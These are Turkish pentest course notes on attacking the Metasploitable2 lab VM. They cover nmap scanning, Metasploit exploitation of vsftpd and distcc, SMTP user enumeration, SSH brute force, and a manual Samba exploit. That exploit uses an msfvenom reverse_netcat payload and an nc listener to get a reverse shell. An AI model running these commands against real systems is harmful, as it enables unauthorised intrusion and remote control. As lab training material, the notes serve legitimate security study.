@@ -1,0 +1,215 @@
+
+--------------------------
+
+* Aktif bilgi toplamak için kullanılan pek çok araç vardır
+	- nmap 		: Ağ üzerinden bilgi toplamak için kullanılır
+	- zenmap 	: nmap'in GUI'li hali
+	- nessus	: nmap gibi ancak ücretlidir
+	- metasploit : Sızma testi framework'udur
+
+* nmap linki
+	- https://nmap.org/dist/
+
+--------------------------
+
+	Metasploitable2 KURULUM
+
+* Sızma testi yapmak için kullanacağımız makina "Metasploitable"
+	- rapid7 tarafından geliştirilmiştir
+	- Metasploitable 2 yi internetten indiriyoruz
+
+* Sanal makina üzerinden yeni bir tane oluşturuyoruz
+	- ISO kalıbı olmadığı için otayı boş bırakıyoruz
+	- Ubuntu-64 bit bir makina olacak şekilde ayarlıyoruz
+	- Sabit disk eklemek için var olan sabit kullanı seçiyoruz
+	- Eğer orada gözükmüyorsa .vdmk uzantılı dosyayı bulup var olan sabir diskler arasında ekleyip makina için seçiyrouz
+
+* Network ayarları içerisinde Ayarlamalar yapıyoruz
+	- Nat Network'e alıyoruz
+	- Promiscuous Mode -> "Allow All" seçiyoruz 
+
+* GUI'si olmayan bir linux sunucu
+
+* Login işlemleri
+	- user : msfadmin
+	- pssw : msfadmin
+
+--------------------------
+
+	BAŞLIYORUZ
+
+* Öncelikli olarak ağ'ı taryıyoruz
+
+* nmap -v -sS -T4 -A 169.254.0.8 
+
+* Sonucu bir txt dosyasına kaydediyoruz. Devamlı bu komutu çalıştırmamak için.
+
+* Sunucu da açık olan port ve bu portlarda çalışan servisleri, versiyonları araştırarak bir açıkları
+olup olmadığını kontrol ediypruz. 
+	- Bu noktada kullanabileceğimiz araçlardan biri de : METASPLOİT 
+ 
+
+* Her portta çalışan servis için metasploit üzerinden sisteme sızmak için aramalar yapabiliriz.
+
+--------------------------
+
+	EXPLOİT ARAMA
+
+* Bir versiyon kakkında sistem açığı bir exploit durumunun olup olmadığını anlamak için internette aratabiliriz.
+	- rapid7
+	- exploit databse
+	- https://book.hacktricks.xyz 
+		> Pek çok konu hakkında bilgi bulunur.
+
+--------------------------
+
+	METASPLOIT ÜZERİNDEN FTP PORTUNDAN SALDIRI
+
+* FTP Sunucusuna "anonymous" ile giriş yapmak nedir ?
+
+* ya da "metasploit" ile girmeye çalışalım
+	- metaspolit
+	- search vsftpd
+	- use <exploit_id>
+	- options 		(veya -> show options) 
+	- set rhost
+	- expolit		(veya -> run)
+		> hata verirse -> exploit -j -z
+	- sessions -l
+	- sessions <sessions_id>
+	! ARTIK İÇERDEYİZ
+
+* background
+	- exploit ile içerisine girdiğimiz makineden çıkıyoruz.
+
+* ecploit çalıştığında reverce_tcp vs görünebilir. Bunlar bağlantının nasıl gerçekleştiğini gösterir.
+	- reverce_tcp : Normalde bizim o makinaya bağlanmamız gerekirken o bize bağlanıyor gibi.
+
+--------------------------
+
+	TELNET vs SSH
+
+* SSH'ın güvensiz halidir.
+
+* Neden Güvensiz ?
+	- paketler şifrelenmeden gönderiliyor
+
+* SSH'ta ise paketler şifrelenir. Yani güvenlidir.
+
+--------------------------
+
+	METERPRATER
+
+* metasploit framework'ü içerisindeki bir araçtır.
+
+* Sızılan sistem içerisinde komut çalıştırmayı sağlar.
+	- meterprater içerisinde var olan komutları çalıştırır ancak.
+
+--------------------------
+
+	SESSION AÇMA
+
+* Hedef servisimiz "distcc"
+
+* nmap -p 3632 10.0.2.8  --script distcc-cve2004-2687.nse --script-args="distcc-cve2004-2687.cmd='id'"
+	- nmap üzerinden id yazan yere yazdığımız komutu karşı sistem üzerinde çalıştırıp bizim ekrana yapıltıracaktır
+
+* Metasploit üzerinden bununla ilgili bir modül bulup onu çalıştırdığımızda oturum açamadaadığını görüyoruz	
+	- Karşı tarafdan gelecek bağlantının nasıl geleceği hakkında bir seçim yapmadığımızdan kaynaklandığını görüyoruz.
+	Yani bir "payload" seçmediğimiz için bununla karşılaşıyoruz. Ya da default olarak seçtiği payload çalışmadı. 
+	> show payloads 
+		- ilgili modül için payloadları görüyoruz
+	
+	
+* Payloads
+	- bind : bizim makinadan karşı makinaya bağlantı kurulmasını sağlamaya çalışmak
+	- reverse : karşı makinadan bizim makinamıza bağlantı yapılmaya çalışır
+
+--------------------------
+
+	smtp-user-enum
+
+* smtp-user-enum -M <mode> -U <username_list> -t <target>
+	-M <mode> : Kullanılacak doğrulama yöntemi. Desteklenen modlar:
+		> VRFY : Kullanıcı doğrulama.
+		> EXPN : Kullanıcı listesi dökümü.
+		> RCPT : E-posta adresi doğrulama.
+	-U <username_list> : Denenecek kullanıcı adlarını içeren dosya.
+	-t <target> : Hedef SMTP sunucusunun IP adresi veya alan adı.
+	-p <port> : SMTP sunucusunun kullandığı port (varsayılan: 25).
+	-d : Ayrıntılı (debug) çıktı.
+
+
+
+* smtp-user-enum -M VRFY -U  /usr/share/wordlists/fern-wifi/common.txt -t 169.254.0.8 
+* smtp-user-enum -M VRFY -U  /usr/share/wordlists/metasploit/namelist.txt -t 169.254.0.8
+	-U : Bu listede yer alan kullanıcıların olup olmadığını arıyor.
+
+--------------------------
+
+	SSH ÜZERİNDEN SIZMA
+
+* ssh kullaniciAdi@ip
+	- Burada bağlanmak için hata alabiliriz
+	- çöüzümü sorun.txt'de
+
+* Metasploit üzerinden
+	- use ssh_login
+		> ssh şifresi için brute force saldırı yapmak için
+	- options 
+		> bunun üzerinden ilgili ayarlamaları yapabiliriz
+	- Çıkan seçenekler üzerinden
+		> kullanıcı adı
+		> kullanıcı adı file
+		> password 
+		> password file 
+		> verbose true (ayrıntılı işlem)
+		> bunlar gibi parametreler doldurularak saldırılır
+		
+
+--------------------------
+
+	MANUEL OLARAK HACLEME
+
+* "samba smbd 3.x - 4.x" için yapıyoruz
+
+* GitHub'dan ilgili olan kodu bulup kalide bir dosyaya ekliyoruz
+(Bu klasörün içinde bir tane python dosyası mevcut)
+
+* pyhton3 samba-python3.py
+	- Bu kodu çalıştırdığımızda bazı kütüphaneler olmadığı için hata alabiliriz.
+	- İlgili kütüphaneyi indirmek için
+		> pip3 install pysmb --break-system-package
+		- Kütüphane kurulumunu yapacaktır
+
+* pip ile yüklemek apt yapısını bocağından sistem "pip install pysmb" ile yüklememize hata veriyor.
+Bu hatayı almamak için ne olursa olsun yükle gibi seçeneği olan "--break-system-package" parametresi giriyoruz
+
+* msfvenom -p cmd/unix/reverse_netcat LHOST=169.254.0.4 LPORT=9999 -f python
+	- Bu kodu çalıştırarak bir buf oluşturucaz.
+	- Tabi ip gibi ilgili değişikliklerin yapılmasını unutmamak lazım
+	- Bunun sonucu kopyalıyoruz
+	- Kopyaladığımız buf kısmını pyhton dosyasındaki buf kısmıyla değiştiriyoruz.
+
+* pyhton3 samba-python3.py 169.254.0.8
+	- Bu şekilde çalıştırdığımızda hata alacaktır.
+	- Çünkü bizim 9999'dan iletişim beklediğimiz porttan iletişim beklemiyoruz bunu açmalıyız
+
+* nc -nvlp 9999
+	-n : ip adresi vermeyeceğim
+	-l : listening yani dinliyorum
+	-p : portu dinliyorum
+	-v : verbose gelen bağlantıyı bana göster
+
+* Portu dinlemeye başladıktan sonra ptthon kodunu çalıştırıyoruz 
+	- pyhton3 samba-python3.py 169.254.0.4
+
+* "nc" ile portu dinlediğimiz shell ekranından bağlıntı geldiği görülecektir
+
+* Artık içerideyiz!
+
+--------------------------
+
+* Command Execution : Komut çalıştırabilme açığı
+
+--------------------------
